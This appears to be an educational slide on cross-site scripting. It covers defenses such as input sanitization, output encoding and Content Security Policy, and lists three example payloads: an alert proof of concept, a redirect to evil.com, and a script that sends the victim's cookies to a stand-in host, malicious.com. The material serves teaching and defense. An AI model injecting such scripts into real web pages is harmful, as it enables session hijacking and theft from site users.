XSS in Action

XSS Payloads and Defenses

Understanding Malicious Scripts and How to Prevent Them

Malicious Script Examples

XSS payloads are typically JavaScript snippets designed to steal cookies, redirect users, or deface pages.

Input Sanitization

Filter or escape potentially malicious characters from user input before processing or storing it.

Output Encoding

Ensure user-supplied data displayed on a page is treated as plain text, preventing browser execution of scripts.

Key Takeaway

Defending against XSS requires both input sanitization to clean data and output encoding to prevent scripts from executing in the browser.

XSS Payload Examples
-- Simple Alert (Proof of Concept)
<script>alert('You are hacked!');</script>

-- Steal Cookies (Session Hijacking)
<script>document.location='http://malicious.com/stealcookie?cookie='+document.cookie;</script>

-- Redirect to Malicious Site
<script>window.location.href = 'http://evil.com';</script>
Consequences

XSS can lead to session hijacking, defacement of the website (from the victim's perspective), redirection to malicious sites, and unauthorized actions on behalf of the user.

Pro-Tip

Use Content Security Policy (CSP) headers to restrict which scripts can run on your web pages, adding another layer of defense against XSS.
